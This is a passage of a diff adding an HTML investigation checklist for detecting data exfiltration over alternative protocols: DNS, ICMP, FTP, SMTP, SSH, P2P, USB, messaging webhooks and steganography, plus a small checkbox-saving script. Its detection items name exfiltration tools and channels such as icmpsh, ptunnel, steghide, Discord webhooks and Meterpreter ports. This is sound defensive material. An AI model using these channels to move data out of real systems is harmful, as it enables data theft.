+        <li>PowerShell or Python scripts performing bit-level manipulation of image files</li>
+        <li>Image files significantly larger than expected for their resolution</li>
+        <li>Sequential image uploads to external services from servers or non-user systems</li>
+        <li>HTTP headers with unusual or binary-looking values</li>
+        <li>Protocol field anomalies: TCP sequence numbers with patterns, IP ID fields with data</li>
+        <li>Timing patterns in network traffic suggesting timing-channel communication</li>
+        <li>Images with EXIF data containing base64 or hex-encoded strings</li>
+      </ul>
+    </div>
+  </details>
+
+  <h2 id="sec-checklist">Exfiltration Over Alternative Protocol Investigation Checklist</h2>
+
+  <details class="section" open id="checklist-1">
+    <summary>1. DNS Exfiltration</summary>
+    <ul class="checklist">
+      <li class="item"><input id="cb-001" type="checkbox"><label for="cb-001">Review DNS queries with subdomain lengths &gt;50 characters containing base64/hex patterns</label></li>
+      <li class="item"><input id="cb-002" type="checkbox"><label for="cb-002">Check query volume from single host exceeding 1000 queries per hour</label></li>
+      <li class="item"><input id="cb-003" type="checkbox"><label for="cb-003">Monitor TXT, NULL, CNAME, or MX record queries from non-infrastructure systems</label></li>
+      <li class="item"><input id="cb-004" type="checkbox"><label for="cb-004">Identify sequential queries with incrementing identifiers: data1., data2., data3.</label></li>
+      <li class="item"><input id="cb-005" type="checkbox"><label for="cb-005">Look for queries to newly registered domains or poor reputation domains</label></li>
+      <li class="item"><input id="cb-006" type="checkbox"><label for="cb-006">Check DNS queries from web/database servers (not DNS clients)</label></li>
+      <li class="item"><input id="cb-007" type="checkbox"><label for="cb-007">Review subdomains with high entropy suggesting encoded data</label></li>
+      <li class="item"><input id="cb-008" type="checkbox"><label for="cb-008">Monitor DNS traffic bypassing corporate DNS (direct to external resolvers)</label></li>
+    </ul>
+  </details>
+
+  <details class="section" id="checklist-2">
+    <summary>2. ICMP Tunnel Exfiltration</summary>
+    <ul class="checklist">
+      <li class="item"><input id="cb-009" type="checkbox"><label for="cb-009">Check ICMP packets with payloads &gt;100 bytes from workstations/servers</label></li>
+      <li class="item"><input id="cb-010" type="checkbox"><label for="cb-010">Review persistent ICMP traffic streams (duration &gt;1 minute) from single host</label></li>
+      <li class="item"><input id="cb-011" type="checkbox"><label for="cb-011">Monitor ICMP with non-standard data patterns (not repeating characters)</label></li>
+      <li class="item"><input id="cb-012" type="checkbox"><label for="cb-012">Identify high volume: &gt;100 ICMP packets per minute from single source</label></li>
+      <li class="item"><input id="cb-013" type="checkbox"><label for="cb-013">Look for ICMP from processes other than ping.exe or network monitoring</label></li>
+      <li class="item"><input id="cb-014" type="checkbox"><label for="cb-014">Check ICMP to external IPs outside troubleshooting contexts</label></li>
+      <li class="item"><input id="cb-015" type="checkbox"><label for="cb-015">Review ICMP type codes other than 8 (echo request) or 0 (echo reply)</label></li>
+      <li class="item"><input id="cb-016" type="checkbox"><label for="cb-016">Monitor processes executing ICMP tunnel tools: ptunnel, icmpsh</label></li>
+    </ul>
+  </details>
+
+  <details class="section" id="checklist-3">
+    <summary>3. FTP/FTPS Upload Detection</summary>
+    <ul class="checklist">
+      <li class="item"><input id="cb-017" type="checkbox"><label for="cb-017">Review ftp.exe with -s parameter (scripted uploads) from workstations</label></li>
+      <li class="item"><input id="cb-018" type="checkbox"><label for="cb-018">Check FTP connections to external IPs or non-corporate FTP servers</label></li>
+      <li class="item"><input id="cb-019" type="checkbox"><label for="cb-019">Monitor FTP PUT commands uploading from %TEMP%, C:\Users\Public\</label></li>
+      <li class="item"><input id="cb-020" type="checkbox"><label for="cb-020">Identify large file transfers (&gt;50MB) via FTP to external destinations</label></li>
+      <li class="item"><input id="cb-021" type="checkbox"><label for="cb-021">Look for FTP from database servers, web servers, domain controllers</label></li>
+      <li class="item"><input id="cb-022" type="checkbox"><label for="cb-022">Check anonymous FTP uploads or connections with default credentials</label></li>
+      <li class="item"><input id="cb-023" type="checkbox"><label for="cb-023">Review multiple files uploaded sequentially via FTP</label></li>
+      <li class="item"><input id="cb-024" type="checkbox"><label for="cb-024">Monitor FTP activity during off-hours (00:00-06:00) or weekends</label></li>
+    </ul>
+  </details>
+
+  <details class="section" id="checklist-4">
+    <summary>4. SMTP from Non-Mail Servers</summary>
+    <ul class="checklist">
+      <li class="item"><input id="cb-025" type="checkbox"><label for="cb-025">Check workstations/app servers making direct SMTP connections (port 25) to external mail</label></li>
+      <li class="item"><input id="cb-026" type="checkbox"><label for="cb-026">Review processes other than mail clients connecting to SMTP ports</label></li>
+      <li class="item"><input id="cb-027" type="checkbox"><label for="cb-027">Monitor PowerShell Send-MailMessage or System.Net.Mail.SmtpClient usage</label></li>
+      <li class="item"><input id="cb-028" type="checkbox"><label for="cb-028">Identify SMTP bypassing corporate relay to Gmail, Yahoo, external providers</label></li>
+      <li class="item"><input id="cb-029" type="checkbox"><label for="cb-029">Look for emails with large attachments (&gt;10MB) from non-mail servers</label></li>
+      <li class="item"><input id="cb-030" type="checkbox"><label for="cb-030">Check multiple emails within minutes to external personal accounts</label></li>
+      <li class="item"><input id="cb-031" type="checkbox"><label for="cb-031">Review email subjects: "backup", "data export", "files"</label></li>
+      <li class="item"><input id="cb-032" type="checkbox"><label for="cb-032">Monitor SMTP from database/file/domain controller servers</label></li>
+    </ul>
+  </details>
+
+  <details class="section" id="checklist-5">
+    <summary>5. SSH/SCP External Connections</summary>
+    <ul class="checklist">
+      <li class="item"><input id="cb-033" type="checkbox"><label for="cb-033">Review SSH connections from workstations to external IPs not in corporate infrastructure</label></li>
+      <li class="item"><input id="cb-034" type="checkbox"><label for="cb-034">Check ssh.exe, putty.exe, pscp.exe executed by non-administrative users</label></li>
+      <li class="item"><input id="cb-035" type="checkbox"><label for="cb-035">Monitor SCP file transfers uploading from staging directories to external hosts</label></li>
+      <li class="item"><input id="cb-036" type="checkbox"><label for="cb-036">Identify SSH to newly created cloud instances or VPS providers</label></li>
+      <li class="item"><input id="cb-037" type="checkbox"><label for="cb-037">Look for large outbound transfers over port 22 (&gt;100MB) from single source</label></li>
+      <li class="item"><input id="cb-038" type="checkbox"><label for="cb-038">Check SSH from script interpreters or Office applications</label></li>
+      <li class="item"><input id="cb-039" type="checkbox"><label for="cb-039">Review SSH to IPs in high-risk geographic regions</label></li>
+      <li class="item"><input id="cb-040" type="checkbox"><label for="cb-040">Monitor SSH key generation followed by immediate external connection</label></li>
+    </ul>
+  </details>
+
+  <details class="section" id="checklist-6">
+    <summary>6. Custom Protocol Usage</summary>
+    <ul class="checklist">
+      <li class="item"><input id="cb-041" type="checkbox"><label for="cb-041">Check outbound connections to high-numbered ports (&gt;10000) to external IPs</label></li>
+      <li class="item"><input id="cb-042" type="checkbox"><label for="cb-042">Review traffic to ports not associated with legitimate business applications</label></li>
+      <li class="item"><input id="cb-043" type="checkbox"><label for="cb-043">Monitor large transfers (&gt;50MB) on non-standard ports</label></li>
+      <li class="item"><input id="cb-044" type="checkbox"><label for="cb-044">Identify connections to backdoor ports: 31337, 12345, 4444, 5555</label></li>
+      <li class="item"><input id="cb-045" type="checkbox"><label for="cb-045">Look for persistent connections on custom ports with periodic data exchange</label></li>
+      <li class="item"><input id="cb-046" type="checkbox"><label for="cb-046">Check multiple systems connecting to same external IP on unusual port</label></li>
+      <li class="item"><input id="cb-047" type="checkbox"><label for="cb-047">Review connections from %TEMP%, %APPDATA%, user directories</label></li>
+      <li class="item"><input id="cb-048" type="checkbox"><label for="cb-048">Monitor port usage matching malware C2: Cobalt Strike (50050), Meterpreter (4444)</label></li>
+    </ul>
+  </details>
+
+  <details class="section" id="checklist-7">
+    <summary>7. P2P Protocol Exfiltration</summary>
+    <ul class="checklist">
+      <li class="item"><input id="cb-049" type="checkbox"><label for="cb-049">Review BitTorrent client processes: bittorrent.exe, utorrent.exe, transmission</label></li>
+      <li class="item"><input id="cb-050" type="checkbox"><label for="cb-050">Check P2P protocol signatures in traffic from corporate systems</label></li>
+      <li class="item"><input id="cb-051" type="checkbox"><label for="cb-051">Monitor high simultaneous connections (&gt;50) to distributed external IPs</label></li>
+      <li class="item"><input id="cb-052" type="checkbox"><label for="cb-052">Identify upload traffic via P2P protocols (seeding behavior)</label></li>
+      <li class="item"><input id="cb-053" type="checkbox"><label for="cb-053">Look for P2P clients executed from %TEMP% or portable installations</label></li>
+      <li class="item"><input id="cb-054" type="checkbox"><label for="cb-054">Check IPFS daemon or client on non-development systems</label></li>
+      <li class="item"><input id="cb-055" type="checkbox"><label for="cb-055">Review P2P from servers, databases, domain controllers</label></li>
+      <li class="item"><input id="cb-056" type="checkbox"><label for="cb-056">Monitor P2P traffic during off-hours or from service accounts</label></li>
+    </ul>
+  </details>
+
+  <details class="section" id="checklist-8">
+    <summary>8. Physical/Removable Media Exfiltration</summary>
+    <ul class="checklist">
+      <li class="item"><input id="cb-057" type="checkbox"><label for="cb-057">Review Event ID 6416 for USB mass storage during off-hours</label></li>
+      <li class="item"><input id="cb-058" type="checkbox"><label for="cb-058">Check large files (&gt;100MB) or many files copied to removable drives</label></li>
+      <li class="item"><input id="cb-059" type="checkbox"><label for="cb-059">Monitor archives (.zip, .rar, .7z) written to USB drives</label></li>
+      <li class="item"><input id="cb-060" type="checkbox"><label for="cb-060">Identify sensitive directories copied: Documents, Database\</label></li>
+      <li class="item"><input id="cb-061" type="checkbox"><label for="cb-061">Look for files copied to USB then deleted from source</label></li>
+      <li class="item"><input id="cb-062" type="checkbox"><label for="cb-062">Check USB usage by accounts that don't typically use devices</label></li>
+      <li class="item"><input id="cb-063" type="checkbox"><label for="cb-063">Review multiple file copies to external drive within short timeframe</label></li>
+      <li class="item"><input id="cb-064" type="checkbox"><label for="cb-064">Monitor USB serial numbers not registered in asset management</label></li>
+    </ul>
+  </details>
+
+  <details class="section" id="checklist-9">
+    <summary>9. Messaging Protocol Abuse</summary>
+    <ul class="checklist">
+      <li class="item"><input id="cb-065" type="checkbox"><label for="cb-065">Check IRC connections (ports 6667, 6697) from servers/workstations</label></li>
+      <li class="item"><input id="cb-066" type="checkbox"><label for="cb-066">Review XMPP protocol traffic from non-communication systems</label></li>
+      <li class="item"><input id="cb-067" type="checkbox"><label for="cb-067">Monitor Telegram API calls (api.telegram.org) from scripts/automated processes</label></li>
+      <li class="item"><input id="cb-068" type="checkbox"><label for="cb-068">Identify Discord webhooks for data exfiltration: discord.com/api/webhooks/</label></li>
+      <li class="item"><input id="cb-069" type="checkbox"><label for="cb-069">Look for Slack webhooks sending large payloads or file attachments</label></li>
+      <li class="item"><input id="cb-070" type="checkbox"><label for="cb-070">Check IRC bot commands or automated message patterns</label></li>
+      <li class="item"><input id="cb-071" type="checkbox"><label for="cb-071">Review messaging clients spawned from scripts or scheduled tasks</label></li>
+      <li class="item"><input id="cb-072" type="checkbox"><label for="cb-072">Monitor high frequency API calls (&gt;100/hour) from single source</label></li>
+    </ul>
+  </details>
+
+  <details class="section" id="checklist-10">
+    <summary>10. Steganography and Covert Channels</summary>
+    <ul class="checklist">
+      <li class="item"><input id="cb-073" type="checkbox"><label for="cb-073">Review steganography tools executed: steghide, openstego, image scripts</label></li>
+      <li class="item"><input id="cb-074" type="checkbox"><label for="cb-074">Check large volumes of images (.png, .jpg, .bmp) created or modified</label></li>
+      <li class="item"><input id="cb-075" type="checkbox"><label for="cb-075">Monitor images uploaded to social media/image hosting from corporate systems</label></li>
+      <li class="item"><input id="cb-076" type="checkbox"><label for="cb-076">Identify PowerShell/Python performing bit-level image manipulation</label></li>
+      <li class="item"><input id="cb-077" type="checkbox"><label for="cb-077">Look for images significantly larger than expected for resolution</label></li>
+      <li class="item"><input id="cb-078" type="checkbox"><label for="cb-078">Check sequential image uploads from servers or non-user systems</label></li>
+      <li class="item"><input id="cb-079" type="checkbox"><label for="cb-079">Review HTTP headers with unusual or binary-looking values</label></li>
+      <li class="item"><input id="cb-080" type="checkbox"><label for="cb-080">Monitor protocol field anomalies: TCP sequence numbers, IP ID with data patterns</label></li>
+    </ul>
+  </details>
+
+</main>
+
+<script>
+/* --- Simple UX helpers --- */
+
+// Persist checkboxes
+const STORAGE_KEY = 't1048_checks_v1';
+function loadChecks(){
+  try{
+    const saved = JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}');
+    for (const [id, val] of Object.entries(saved)){
+      const el = document.getElementById(id);
+      if (el && el.type === 'checkbox') el.checked = !!val;
+    }
+  }catch(e){ /* ignore parse errors */ }
+}
+function saveChecks(){
+  const data = {};
+  document.querySelectorAll('input[type="checkbox"][id]').forEach(cb => data[cb.id] = cb.checked);
+  localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
+}
+document.addEventListener('change', e => {
+  if (e.target.matches('input[type="checkbox"]')) saveChecks();
+});
+loadChecks();
+
+// Filter only checklist items
+const filter = document.getElementById('filter');
+filter?.addEventListener('input', () => {
+  const q = filter.value.trim().toLowerCase();
+  document.querySelectorAll('.checklist .item').forEach(li => {
+    const txt = li.textContent.toLowerCase();
+    li.style.display = txt.includes(q) ? '' : 'none';
+  });
+  // Auto-expand sections if something inside matches
+  document.querySelectorAll('details.section').forEach(d => {
+    const hasVisible = d.querySelector('.checklist .item:not([style*="display: none"])');
+    if (q && hasVisible) d.open = true;
+  });
+});
+
+// Expand/collapse
+const expandBtn = document.getElementById('expand');
+const collapseBtn = document.getElementById('collapse');
+expandBtn?.addEventListener('click', () => document.querySelectorAll('details.section').forEach(d => d.open = true));
+collapseBtn?.addEventListener('click', () => document.querySelectorAll('details.section').forEach(d => d.open = false));
+
+// Clear checks
+document.getElementById('clear')?.addEventListener('click', () => {
+  document.querySelectorAll('input[type="checkbox"]').forEach(cb => cb.checked = false);
+  saveChecks();
+});
+
+</script>
+</body>
+</html>
